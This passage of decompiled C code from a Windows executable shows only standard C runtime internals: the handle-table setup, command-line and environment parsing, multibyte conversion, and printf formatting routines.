           (puVar2 = FUN_00403d00(0x100), UVar6 = DAT_0040e300, puVar2 != (uint *)0x0))) {
      (&DAT_0040e304)[iVar7] = puVar2;
      DAT_0040e300 = DAT_0040e300 + 0x20;
      for (; puVar2 < (uint *)((int)(&DAT_0040e304)[iVar7] + 0x100); puVar2 = puVar2 + 2) {
        *(undefined *)(puVar2 + 1) = 0;
        *puVar2 = 0xffffffff;
        *(undefined *)((int)puVar2 + 5) = 10;
      }
      iVar7 = iVar7 + 1;
    }
    uVar8 = 0;
    if (0 < (int)UVar6) {
      do {
        if (((*local_50 != (HANDLE)0xffffffff) && ((*(byte *)local_54 & 1) != 0)) &&
           (((*(byte *)local_54 & 8) != 0 || (DVar3 = GetFileType(*local_50), DVar3 != 0)))) {
          ppvVar1 = (HANDLE *)((int)(&DAT_0040e304)[(int)uVar8 >> 5] + (uVar8 & 0x1f) * 8);
          *ppvVar1 = *local_50;
          *(byte *)(ppvVar1 + 1) = *(byte *)local_54;
        }
        uVar8 = uVar8 + 1;
        local_54 = (UINT *)((int)local_54 + 1);
        local_50 = local_50 + 1;
      } while ((int)uVar8 < (int)UVar6);
    }
  }
  iVar7 = 0;
  do {
    ppvVar1 = (HANDLE *)(DAT_0040e304 + iVar7 * 2);
    if (*ppvVar1 == (HANDLE)0xffffffff) {
      *(undefined *)(ppvVar1 + 1) = 0x81;
      if (iVar7 == 0) {
        DVar3 = 0xfffffff6;
      }
      else if (iVar7 == 1) {
        DVar3 = 0xfffffff5;
      }
      else {
        DVar3 = 0xfffffff4;
      }
      hFile = GetStdHandle(DVar3);
      if ((hFile == (HANDLE)0xffffffff) || (DVar3 = GetFileType(hFile), DVar3 == 0)) {
        *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 0x40;
      }
      else {
        hSourceProcessHandle = GetCurrentProcess();
        hTargetProcessHandle = GetCurrentProcess();
        BVar4 = DuplicateHandle(hSourceProcessHandle,hFile,hTargetProcessHandle,&local_4c,0,1,2);
        if (BVar4 != 0) {
          hFile = local_4c;
        }
        *ppvVar1 = hFile;
        if ((DVar3 & 0xff) == 2) {
          *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 0x40;
        }
        else if ((DVar3 & 0xff) == 3) {
          *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 8;
        }
      }
    }
    else {
      *(byte *)(ppvVar1 + 1) = *(byte *)(ppvVar1 + 1) | 0x80;
    }
    iVar7 = iVar7 + 1;
  } while (iVar7 < 3);
  SetHandleCount(DAT_0040e300);
  return;
}



int * __cdecl FUN_00405ef0(char *param_1,char **param_2,char *param_3,int *param_4,int *param_5)

{
  char cVar1;
  bool bVar2;
  bool bVar3;
  char *pcVar4;
  uint local_14;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (char **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  if (*param_1 == '\"') {
    while ((pcVar4 = param_1 + 1, *pcVar4 != '\"' && (*pcVar4 != '\0'))) {
      if (param_3 != (char *)0x0) {
        *param_3 = *pcVar4;
        param_3 = param_3 + 1;
      }
      *param_5 = *param_5 + 1;
      param_1 = pcVar4;
    }
    if (param_3 != (char *)0x0) {
      *param_3 = '\0';
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
    if (*pcVar4 == '\"') {
      pcVar4 = param_1 + 2;
    }
  }
  else {
    do {
      pcVar4 = param_1;
      if (param_3 != (char *)0x0) {
        *param_3 = *pcVar4;
        param_3 = param_3 + 1;
      }
      *param_5 = *param_5 + 1;
      param_1 = pcVar4 + 1;
      cVar1 = *pcVar4;
    } while (((cVar1 != ' ') && (cVar1 != '\0')) && (cVar1 != '\t'));
    if ((cVar1 != '\0') && (pcVar4 = param_1, param_3 != (char *)0x0)) {
      param_3[-1] = '\0';
    }
  }
  bVar2 = false;
  while( true ) {
    if (*pcVar4 != '\0') {
      for (; (*pcVar4 == ' ' || (*pcVar4 == '\t')); pcVar4 = pcVar4 + 1) {
      }
    }
    if (*pcVar4 == '\0') break;
    if (param_2 != (char **)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      local_14 = 0;
      for (; *pcVar4 == '\\'; pcVar4 = pcVar4 + 1) {
        local_14 = local_14 + 1;
      }
      bVar3 = true;
      if (*pcVar4 == '\"') {
        bVar3 = true;
        if ((local_14 & 1) == 0) {
          if (bVar2) {
            if (pcVar4[1] == '\"') {
              pcVar4 = pcVar4 + 1;
              bVar3 = true;
            }
            else {
              bVar3 = false;
            }
          }
          else {
            bVar3 = false;
          }
          bVar2 = !bVar2;
        }
        local_14 = local_14 >> 1;
      }
      while (local_14 != 0) {
        if (param_3 != (char *)0x0) {
          *param_3 = '\\';
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
        local_14 = local_14 - 1;
      }
      cVar1 = *pcVar4;
      if ((cVar1 == '\0') || ((!bVar2 && ((cVar1 == ' ' || (cVar1 == '\t')))))) break;
      if (bVar3) {
        if (param_3 != (char *)0x0) {
          *param_3 = *pcVar4;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      pcVar4 = pcVar4 + 1;
    }
    if (param_3 != (char *)0x0) {
      *param_3 = '\0';
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (param_2 != (char **)0x0) {
    *param_2 = (char *)0x0;
  }
  *param_4 = *param_4 + 1;
  return param_4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00406080(void)

{
  char *pcVar1;
  char **ppcVar2;
  CHAR local_110 [260];
  int local_c;
  int local_8;
  
  pcVar1 = GetCommandLineA();
  if (*pcVar1 == '\0') {
    GetModuleFileNameA((HMODULE)0x0,local_110,0x104);
    pcVar1 = local_110;
  }
  FUN_00405ef0(pcVar1,(char **)0x0,(char *)0x0,&local_8,&local_c);
  ppcVar2 = (char **)FUN_00403d00(local_c + local_8 * 4);
  if (ppcVar2 == (char **)0x0) {
    FUN_00405930(1);
  }
  FUN_00405ef0(pcVar1,ppcVar2,(char *)(ppcVar2 + local_8),&local_8,&local_c);
  _DAT_0040d264 = local_8 + -1;
  _DAT_0040d268 = ppcVar2;
  return;
}



void FUN_00406120(void)

{
  char cVar1;
  LPCH pCVar2;
  int iVar3;
  uint *puVar4;
  int iVar5;
  int iVar6;
  char *pcVar7;
  LPCH pCVar8;
  char *pcVar9;
  
  pCVar2 = GetEnvironmentStrings();
  if (pCVar2 == (LPCH)0x0) {
    pCVar2 = PTR_DAT_0040d890;
  }
  iVar6 = 0;
  for (pCVar8 = pCVar2; *pCVar8 != '\0'; pCVar8 = pCVar8 + iVar3) {
    iVar5 = -1;
    do {
      iVar3 = iVar5;
      iVar5 = iVar3 + 1;
    } while (pCVar8[iVar5] != '\0');
    iVar3 = iVar3 + 2;
    if (*pCVar8 != '=') {
      iVar6 = iVar6 + iVar3;
    }
  }
  puVar4 = FUN_00403d00(iVar6 + 1);
  pcVar9 = pCVar2;
  DAT_0040d270 = puVar4;
  if (puVar4 == (uint *)0x0) {
    FUN_00405930(1);
  }
  for (; *pcVar9 != '\0'; pcVar9 = pcVar9 + iVar5) {
    iVar6 = -1;
    do {
      iVar5 = iVar6;
      iVar6 = iVar5 + 1;
    } while (pcVar9[iVar6] != '\0');
    iVar5 = iVar5 + 2;
    if (*pcVar9 != '=') {
      pcVar7 = pcVar9;
      do {
        cVar1 = *pcVar7;
        pcVar7[(int)puVar4 - (int)pcVar9] = cVar1;
        pcVar7 = pcVar7 + 1;
      } while (cVar1 != '\0');
      puVar4 = (uint *)((int)puVar4 + iVar5);
    }
  }
  *(undefined *)puVar4 = 0;
  if (pCVar2 != PTR_DAT_0040d890) {
    FreeEnvironmentStringsA(pCVar2);
  }
  return;
}



byte * FUN_004061e0(void)

{
  byte *pbVar1;
  byte *pbVar2;
  
  pbVar1 = (byte *)GetCommandLineA();
  if (*pbVar1 == 0x22) {
    do {
      pbVar2 = pbVar1;
      pbVar1 = pbVar2 + 1;
      if (*pbVar1 == 0x22) break;
    } while (*pbVar1 != 0);
    if (*pbVar1 == 0x22) {
      pbVar1 = pbVar2 + 2;
    }
  }
  else {
    for (; 0x20 < *pbVar1; pbVar1 = pbVar1 + 1) {
    }
  }
  for (; (*pbVar1 != 0 && (*pbVar1 < 0x21)); pbVar1 = pbVar1 + 1) {
  }
  return pbVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte * __cdecl FUN_00406290(LPWSTR param_1,byte *param_2,int param_3,uint *param_4)

{
  ushort uVar1;
  int local_14;
  WCHAR local_e;
  byte *local_c;
  byte local_5;
  
  local_5 = *(byte *)((int)param_4 + 6);
  local_c = param_2;
  local_e = *(WCHAR *)param_4;
  if (PTR_DAT_0040d920 == (undefined *)0x0) {
    if (param_2 == (byte *)0x0) {
      *param_4 = 0;
      param_4[1] = 0;
      local_c = (byte *)0x0;
    }
    else {
      for (; param_3 != 0; param_3 = param_3 + -1) {
        if (local_5 == 0) {
          if ((*local_c & 0x80) == 0) {
            local_e = (WCHAR)*local_c;
          }
          else if ((*local_c & 0xe0) == 0xc0) {
            local_e = *local_c & 0x1f;
            local_5 = 1;
          }
          else {
            if ((*local_c & 0xf0) != 0xe0) {
              _DAT_0040d334 = 0x2a;
              return (byte *)0xffffffff;
            }
            local_e = *local_c & 0xf;
            local_5 = 2;
          }
        }
        else {
          if ((*local_c & 0xc0) != 0x80) {
            _DAT_0040d334 = 0x2a;
            return (byte *)0xffffffff;
          }
          local_e = local_e << 6 | *local_c & 0x3f;
          local_5 = local_5 - 1;
        }
        if (local_5 == 0) {
          if (param_1 != (LPWSTR)0x0) {
            *param_1 = local_e;
          }
          *(undefined2 *)((int)param_4 + 6) = 0;
          if (local_e == L'\0') {
            return (byte *)0x0;
          }
          return local_c + (1 - (int)param_2);
        }
        local_c = local_c + 1;
      }
      *param_4 = (uint)(ushort)local_e;
      *(ushort *)((int)param_4 + 6) = (ushort)local_5;
      local_c = (byte *)0xfffffffe;
    }
  }
  else if (PTR_DAT_0040d920 == (undefined *)0x1) {
    if (param_2 == (byte *)0x0) {
      *param_4 = 0;
      param_4[1] = 0;
      local_c = (byte *)0x0;
    }
    else if (param_3 == 0) {
      local_c = (byte *)0xfffffffe;
    }
    else {
      local_c = (byte *)FUN_00407d90(param_1,(LPCSTR)param_2);
    }
  }
  else {
    local_14 = 0;
    if (param_2 == (byte *)0x0) {
      *param_4 = 0;
      param_4[1] = 0;
      local_c = (byte *)(*(ushort *)PTR_DAT_0040d920 & 0xf00);
    }
    else {
      do {
        if (param_3 == 0) {
          *param_4 = (uint)(ushort)local_e;
          *(ushort *)((int)param_4 + 6) = (ushort)local_5;
          return (byte *)0xfffffffe;
        }
        if ((((0xf < local_5) || ((&PTR_DAT_0040d920)[local_5] == (undefined *)0x0)) ||
            (local_14 = local_14 + 1, 0xfef < local_14)) ||
           (uVar1 = *(ushort *)((&PTR_DAT_0040d920)[local_5] + (uint)*local_c * 2), uVar1 == 0)) {
          _DAT_0040d334 = 0x2a;
          return (byte *)0xffffffff;
        }
        local_5 = (byte)(uVar1 >> 8) & 0xf;
        if ((uVar1 & 0x8000) != 0) {
          local_e = local_e & 0xff00U | uVar1 & 0xff;
        }
        if ((uVar1 & 0x1000) != 0) {
          local_e = local_e << 8;
        }
        if (((uVar1 & 0x4000) != 0) && (*local_c != 0)) {
          local_c = local_c + 1;
          param_3 = param_3 + -1;
          local_14 = 0;
        }
      } while ((uVar1 & 0x2000) == 0);
      if (param_1 != (LPWSTR)0x0) {
        *param_1 = local_e;
      }
      *param_4 = (uint)(ushort)local_e;
      *(ushort *)((int)param_4 + 6) = (ushort)local_5;
      if (local_e == L'\0') {
        local_c = (byte *)0x0;
      }
      else {
        local_c = local_c + -(int)param_2;
      }
    }
  }
  return local_c;
}



uint * __cdecl FUN_00406560(uint *param_1,byte param_2)

{
  byte bVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  uint *puVar6;
  char cVar7;
  
  uVar2 = (uint)param_1 & 3;
  while (uVar2 != 0) {
    bVar1 = *(byte *)param_1;
    param_1 = (uint *)((int)param_1 + 1);
    if (bVar1 == param_2) goto LAB_00406621;
    if (bVar1 == 0) {
      return (uint *)0x0;
    }
    uVar2 = (uint)param_1 & 3;
  }
  puVar6 = param_1;
  while( true ) {
    while( true ) {
      uVar2 = *puVar6;
      uVar5 = uVar2 ^ (uint)param_2 * 0x1010101;
      uVar4 = ~uVar2 ^ uVar2 + 0x7efefeff;
      param_1 = puVar6 + 1;
      if (((~uVar5 ^ uVar5 + 0x7efefeff) & 0x81010100) != 0) break;
      puVar6 = param_1;
      if ((uVar4 & 0x81010100) != 0) {
        if ((uVar4 & 0x1010100) != 0) {
          return (uint *)0x0;
        }
        if ((uVar2 + 0x7efefeff & 0x80000000) == 0) {
          return (uint *)0x0;
        }
      }
    }
    uVar2 = *puVar6;
    cVar7 = (char)((uint)param_2 * 0x1010101);
    if ((char)uVar2 == cVar7) {
      return puVar6;
    }
    if ((char)uVar2 == '\0') {
      return (uint *)0x0;
    }
    cVar3 = (char)(uVar2 >> 8);
    if (cVar3 == cVar7) {
      return (uint *)((int)puVar6 + 1);
    }
    if (cVar3 == '\0') {
      return (uint *)0x0;
    }
    cVar3 = (char)(uVar2 >> 0x10);
    if (cVar3 == cVar7) {
      return (uint *)((int)puVar6 + 2);
    }
    if (cVar3 == '\0') {
      return (uint *)0x0;
    }
    cVar3 = (char)(uVar2 >> 0x18);
    if (cVar3 == cVar7) break;
    puVar6 = param_1;
    if (cVar3 == '\0') {
      return (uint *)0x0;
    }
  }
LAB_00406621:
  return (uint *)((int)param_1 + -1);
}



undefined4 __cdecl FUN_00406650(double *param_1,double **param_2,byte param_3,int param_4)

{
  byte bVar1;
  undefined4 uVar2;
  double *pdVar3;
  int *piVar4;
  int iVar5;
  uint *puVar6;
  wchar_t local_8;
  undefined2 local_6;
  
  if (param_3 == 0x50) {
switchD_004066cb_caseD_70:
    pdVar3 = *param_2;
    *param_2 = (double *)((int)pdVar3 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
    *(undefined4 *)((int)param_1 + 4) = 0;
    *(undefined4 *)((int)param_1 + 0x34) = 8;
    *(ushort *)(param_1 + 7) = *(ushort *)(param_1 + 7) | 0x10;
    *(int *)(param_1 + 2) = *(int *)((int)param_1 + 0x14) + param_4;
    FUN_00407f80(param_1,((param_3 == 0x50) - 1U & 0x20) + 0x58);
    return 0;
  }
  if (param_3 < 0x51) {
    if (param_3 == 0x25) {
      iVar5 = *(int *)((int)param_1 + 0x14);
      *(int *)((int)param_1 + 0x14) = iVar5 + 1;
      *(undefined *)(iVar5 + param_4) = 0x25;
      return 0;
    }
    if (0x24 < param_3) {
      switch(param_3) {
      case 0x41:
      case 0x45:
      case 0x46:
      case 0x47:
switchD_00406698_caseD_41:
        pdVar3 = *param_2;
        *param_2 = pdVar3 + 1;
        *param_1 = *pdVar3;
        iVar5 = FUN_00408180((short *)param_1);
        if ((short)iVar5 != 2) {
          if ((*(ushort *)((int)param_1 + 6) & 0x8000) == 0) {
            if ((*(ushort *)(param_1 + 7) & 2) == 0) {
              if ((*(ushort *)(param_1 + 7) & 1) != 0) {
                iVar5 = *(int *)((int)param_1 + 0x14);
                *(int *)((int)param_1 + 0x14) = iVar5 + 1;
                *(undefined *)(iVar5 + param_4) = 0x20;
              }
            }
            else {
              iVar5 = *(int *)((int)param_1 + 0x14);
              *(int *)((int)param_1 + 0x14) = iVar5 + 1;
              *(undefined *)(iVar5 + param_4) = 0x2b;
            }
          }
          else {
            iVar5 = *(int *)((int)param_1 + 0x14);
            *(int *)((int)param_1 + 0x14) = iVar5 + 1;
            *(undefined *)(iVar5 + param_4) = 0x2d;
          }
        }
        *(int *)(param_1 + 2) = *(int *)((int)param_1 + 0x14) + param_4;
        FUN_00408190(param_1,param_3);
        return 0;
      }
    }
    goto switchD_00406698_caseD_42;
  }
  if (param_3 == 0x58) {
switchD_004066cb_caseD_6f:
    bVar1 = *(byte *)((int)param_1 + 0x3a);
    if (bVar1 == 0x68) {
      pdVar3 = *param_2;
      *param_2 = (double *)((int)pdVar3 + 4);
      *(uint *)param_1 = (uint)*(ushort *)pdVar3;
      *(undefined4 *)((int)param_1 + 4) = 0;
    }
    else if (bVar1 == 0x6a) {
      pdVar3 = *param_2;
      *param_2 = pdVar3 + 1;
      uVar2 = *(undefined4 *)((int)pdVar3 + 4);
      *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
      *(undefined4 *)((int)param_1 + 4) = uVar2;
    }
    else if (bVar1 == 0x6c) {
      pdVar3 = *param_2;
      *param_2 = (double *)((int)pdVar3 + 4);
      *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
      *(undefined4 *)((int)param_1 + 4) = 0;
    }
    else {
      if (bVar1 < 0x6d) {
        if (bVar1 == 0x62) {
          pdVar3 = *param_2;
          *param_2 = (double *)((int)pdVar3 + 4);
          *(uint *)param_1 = (uint)*(byte *)pdVar3;
          *(undefined4 *)((int)param_1 + 4) = 0;
          goto LAB_00406a26;
        }
      }
      else {
        if (bVar1 == 0x71) {
          pdVar3 = *param_2;
          *param_2 = pdVar3 + 1;
          uVar2 = *(undefined4 *)((int)pdVar3 + 4);
          *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
          *(undefined4 *)((int)param_1 + 4) = uVar2;
          goto LAB_00406a26;
        }
        if (bVar1 == 0x74) {
          pdVar3 = *param_2;
          *param_2 = (double *)((int)pdVar3 + 4);
          iVar5 = *(int *)pdVar3;
          *(int *)param_1 = iVar5;
          *(int *)((int)param_1 + 4) = iVar5 >> 0x1f;
          goto LAB_00406a26;
        }
        if ((0x70 < bVar1) && (bVar1 == 0x7a)) {
          pdVar3 = *param_2;
          *param_2 = (double *)((int)pdVar3 + 4);
          *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
          *(undefined4 *)((int)param_1 + 4) = 0;
          goto LAB_00406a26;
        }
      }
      pdVar3 = *param_2;
      *param_2 = (double *)((int)pdVar3 + 4);
      *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
      *(undefined4 *)((int)param_1 + 4) = 0;
    }
LAB_00406a26:
    if ((((*(ushort *)(param_1 + 7) & 8) != 0) &&
        ((*(int *)((int)param_1 + 4) != 0 || (*(int *)param_1 != 0)))) &&
       ((param_3 == 0x78 || (param_3 == 0x58)))) {
      iVar5 = *(int *)((int)param_1 + 0x14);
      *(int *)((int)param_1 + 0x14) = iVar5 + 1;
      *(undefined *)(iVar5 + param_4) = 0x30;
      iVar5 = *(int *)((int)param_1 + 0x14);
      *(int *)((int)param_1 + 0x14) = iVar5 + 1;
      *(byte *)(iVar5 + param_4) = param_3;
    }
    *(int *)(param_1 + 2) = *(int *)((int)param_1 + 0x14) + param_4;
    FUN_00407f80(param_1,param_3);
    return 0;
  }
  if (param_3 < 0x58) {
switchD_00406698_caseD_42:
    iVar5 = *(int *)((int)param_1 + 0x14);
    *(int *)((int)param_1 + 0x14) = iVar5 + 1;
    if (param_3 == 0) {
      param_3 = 0x25;
    }
    *(byte *)(iVar5 + param_4) = param_3;
  }
  else {
    switch(param_3) {
    case 0x61:
    case 0x65:
    case 0x66:
    case 0x67:
      goto switchD_00406698_caseD_41;
    default:
      goto switchD_00406698_caseD_42;
    case 99:
      if (*(char *)((int)param_1 + 0x3a) == 'l') {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        local_8 = (wchar_t)*(undefined4 *)pdVar3;
        local_6 = 0;
        *(undefined4 *)((int)param_1 + 0x2c) = 0xffffffff;
        iVar5 = FUN_00407de0((int)param_1,&local_8);
        if (iVar5 < 0) {
          return 0xffffffff;
        }
      }
      else {
        iVar5 = *(int *)((int)param_1 + 0x14);
        *(int *)((int)param_1 + 0x14) = iVar5 + 1;
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        *(char *)(iVar5 + param_4) = (char)*(undefined4 *)pdVar3;
      }
      break;
    case 100:
    case 0x69:
      bVar1 = *(byte *)((int)param_1 + 0x3a);
      if (bVar1 == 0x68) {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        iVar5 = (int)*(short *)pdVar3;
        *(int *)param_1 = iVar5;
        *(int *)((int)param_1 + 4) = iVar5 >> 0x1f;
      }
      else if (bVar1 == 0x6a) {
        pdVar3 = *param_2;
        *param_2 = pdVar3 + 1;
        uVar2 = *(undefined4 *)((int)pdVar3 + 4);
        *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
        *(undefined4 *)((int)param_1 + 4) = uVar2;
      }
      else if (bVar1 == 0x6c) {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        iVar5 = *(int *)pdVar3;
        *(int *)param_1 = iVar5;
        *(int *)((int)param_1 + 4) = iVar5 >> 0x1f;
      }
      else if (bVar1 < 0x6d) {
        if (bVar1 == 0x62) {
          pdVar3 = *param_2;
          *param_2 = (double *)((int)pdVar3 + 4);
          iVar5 = (int)*(char *)pdVar3;
          *(int *)param_1 = iVar5;
          *(int *)((int)param_1 + 4) = iVar5 >> 0x1f;
        }
        else {
LAB_00406860:
          pdVar3 = *param_2;
          *param_2 = (double *)((int)pdVar3 + 4);
          iVar5 = *(int *)pdVar3;
          *(int *)param_1 = iVar5;
          *(int *)((int)param_1 + 4) = iVar5 >> 0x1f;
        }
      }
      else if (bVar1 == 0x71) {
        pdVar3 = *param_2;
        *param_2 = pdVar3 + 1;
        uVar2 = *(undefined4 *)((int)pdVar3 + 4);
        *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
        *(undefined4 *)((int)param_1 + 4) = uVar2;
      }
      else if (bVar1 == 0x74) {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        iVar5 = *(int *)pdVar3;
        *(int *)param_1 = iVar5;
        *(int *)((int)param_1 + 4) = iVar5 >> 0x1f;
      }
      else {
        if ((bVar1 < 0x71) || (bVar1 != 0x7a)) goto LAB_00406860;
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        *(undefined4 *)param_1 = *(undefined4 *)pdVar3;
        *(undefined4 *)((int)param_1 + 4) = 0;
      }
      if ((*(int *)((int)param_1 + 4) < 1) && (*(int *)((int)param_1 + 4) < 0)) {
        iVar5 = *(int *)((int)param_1 + 0x14);
        *(int *)((int)param_1 + 0x14) = iVar5 + 1;
        *(undefined *)(iVar5 + param_4) = 0x2d;
      }
      else if ((*(ushort *)(param_1 + 7) & 2) == 0) {
        if ((*(ushort *)(param_1 + 7) & 1) != 0) {
          iVar5 = *(int *)((int)param_1 + 0x14);
          *(int *)((int)param_1 + 0x14) = iVar5 + 1;
          *(undefined *)(iVar5 + param_4) = 0x20;
        }
      }
      else {
        iVar5 = *(int *)((int)param_1 + 0x14);
        *(int *)((int)param_1 + 0x14) = iVar5 + 1;
        *(undefined *)(iVar5 + param_4) = 0x2b;
      }
      *(int *)(param_1 + 2) = *(int *)((int)param_1 + 0x14) + param_4;
      FUN_00407f80(param_1,param_3);
      break;
    case 0x6e:
      if (*(char *)((int)param_1 + 0x3b) != '\0') {
        FUN_00408710(0x16);
        return 0xffffffff;
      }
      bVar1 = *(byte *)((int)param_1 + 0x3a);
      if (bVar1 == 0x68) {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        **(undefined2 **)pdVar3 = *(undefined2 *)(param_1 + 6);
      }
      else if (bVar1 == 0x6a) {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        piVar4 = *(int **)pdVar3;
        iVar5 = *(int *)(param_1 + 6);
        *piVar4 = iVar5;
        piVar4[1] = iVar5 >> 0x1f;
      }
      else if (bVar1 == 0x6c) {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        **(undefined4 **)pdVar3 = *(undefined4 *)(param_1 + 6);
      }
      else {
        if (bVar1 < 0x6d) {
          if (bVar1 == 0x62) {
            pdVar3 = *param_2;
            *param_2 = (double *)((int)pdVar3 + 4);
            **(undefined **)pdVar3 = *(undefined *)(param_1 + 6);
            return 0;
          }
        }
        else {
          if (bVar1 == 0x71) {
            pdVar3 = *param_2;
            *param_2 = (double *)((int)pdVar3 + 4);
            piVar4 = *(int **)pdVar3;
            iVar5 = *(int *)(param_1 + 6);
            *piVar4 = iVar5;
            piVar4[1] = iVar5 >> 0x1f;
            return 0;
          }
          if (bVar1 == 0x74) {
            pdVar3 = *param_2;
            *param_2 = (double *)((int)pdVar3 + 4);
            **(undefined4 **)pdVar3 = *(undefined4 *)(param_1 + 6);
            return 0;
          }
          if ((0x70 < bVar1) && (bVar1 == 0x7a)) {
            pdVar3 = *param_2;
            *param_2 = (double *)((int)pdVar3 + 4);
            **(undefined4 **)pdVar3 = *(undefined4 *)(param_1 + 6);
            return 0;
          }
        }
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        **(undefined4 **)pdVar3 = *(undefined4 *)(param_1 + 6);
      }
      break;
    case 0x6f:
    case 0x75:
    case 0x78:
      goto switchD_004066cb_caseD_6f;
    case 0x70:
      goto switchD_004066cb_caseD_70;
    case 0x73:
      if (*(char *)((int)param_1 + 0x3a) == 'l') {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        iVar5 = FUN_00407de0((int)param_1,*(wchar_t **)pdVar3);
        if (iVar5 < 0) {
          return 0xffffffff;
        }
      }
      else {
        pdVar3 = *param_2;
        *param_2 = (double *)((int)pdVar3 + 4);
        *(undefined4 *)(param_1 + 2) = *(undefined4 *)pdVar3;
        if (*(char *)((int)param_1 + 0x3b) == '\0') {
          if (*(int *)(param_1 + 2) == 0) {
            *(char **)(param_1 + 2) = "(null)";
          }
        }
        else if (*(int *)(param_1 + 2) == 0) {
          FUN_00408710(0x16);
          return 0xffffffff;
        }
        if (*(int *)((int)param_1 + 0x2c) < 0) {
          iVar5 = -1;
          do {
            iVar5 = iVar5 + 1;
          } while (*(char *)(*(int *)(param_1 + 2) + iVar5) != '\0');
        }
        else {
          puVar6 = FUN_00405850(*(uint **)(param_1 + 2),0,*(uint **)((int)param_1 + 0x2c));
          if (puVar6 == (uint *)0x0) {
            iVar5 = *(int *)((int)param_1 + 0x2c);
          }
          else {
            iVar5 = (int)puVar6 - *(int *)(param_1 + 2);
          }
        }
        *(int *)((int)param_1 + 0x1c) = iVar5;
      }
    }
  }
  return 0;
}



undefined4 __cdecl FUN_00406dc0(int param_1,undefined4 param_2)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  uVar4 = (((((*(int *)(param_1 + 0x34) - *(int *)(param_1 + 0x14)) - *(int *)(param_1 + 0x18)) -
            *(int *)(param_1 + 0x1c)) - *(int *)(param_1 + 0x20)) - *(int *)(param_1 + 0x24)) -
          *(int *)(param_1 + 0x28);
  if ((((*(ushort *)(param_1 + 0x38) & 4) == 0) && (0 < (int)uVar4)) &&
     (uVar3 = uVar4, 0 < (int)uVar4)) {
    do {
      uVar6 = uVar3;
      if (0x20 < uVar3) {
        uVar6 = 0x20;
      }
      if (0 < (int)uVar6) {
        iVar2 = (**(code **)(param_1 + 8))
                          (*(undefined4 *)(param_1 + 0xc),"                                ",uVar6);
        *(int *)(param_1 + 0xc) = iVar2;
        if (iVar2 == 0) {
          return 0xffffffff;
        }
        *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + uVar6;
      }
      uVar5 = uVar3 - uVar6;
      bVar1 = (int)uVar6 <= (int)uVar3;
      uVar3 = uVar5;
    } while (uVar5 != 0 && bVar1);
  }
  if (0 < *(int *)(param_1 + 0x14)) {
    iVar2 = (**(code **)(param_1 + 8))
                      (*(undefined4 *)(param_1 + 0xc),param_2,*(undefined4 *)(param_1 + 0x14));
    *(int *)(param_1 + 0xc) = iVar2;
    if (iVar2 == 0) {
      return 0xffffffff;
    }
    *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + *(int *)(param_1 + 0x14);
  }
  if ((0 < *(int *)(param_1 + 0x18)) &&
     (uVar3 = *(uint *)(param_1 + 0x18), 0 < (int)*(uint *)(param_1 + 0x18))) {
    do {
      uVar6 = uVar3;
      if (0x20 < uVar3) {
        uVar6 = 0x20;
      }
      if (0 < (int)uVar6) {
        iVar2 = (**(code **)(param_1 + 8))
                          (*(undefined4 *)(param_1 + 0xc),"00000000000000000000000000000000",uVar6);
        *(int *)(param_1 + 0xc) = iVar2;
        if (iVar2 == 0) {
          return 0xffffffff;
        }
        *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + uVar6;
      }
      uVar5 = uVar3 - uVar6;
      bVar1 = (int)uVar6 <= (int)uVar3;
      uVar3 = uVar5;
    } while (uVar5 != 0 && bVar1);
  }
  if (0 < *(int *)(param_1 + 0x1c)) {
    iVar2 = (**(code **)(param_1 + 8))
                      (*(undefined4 *)(param_1 + 0xc),*(undefined4 *)(param_1 + 0x10),
                       *(undefined4 *)(param_1 + 0x1c));
    *(int *)(param_1 + 0xc) = iVar2;
    if (iVar2 == 0) {
      return 0xffffffff;
    }
    *(int *)(param_1 + 0x30) = *(int *)(param_1 + 0x30) + *(int *)(param_1 + 0x1c);
  }
  if ((0 < *(int *)(param_1 + 0x20)) &&
     (uVar3 = *(uint *)(param_1 + 0x20), 0 < (int)*(uint *)(param_1 + 0x20))) {
    do {
      uVar6 = uVar3;
      if (0x20 < uVar3) {
        uVar6 = 0x20;
      }
      if (0 < (int)uVar6) {
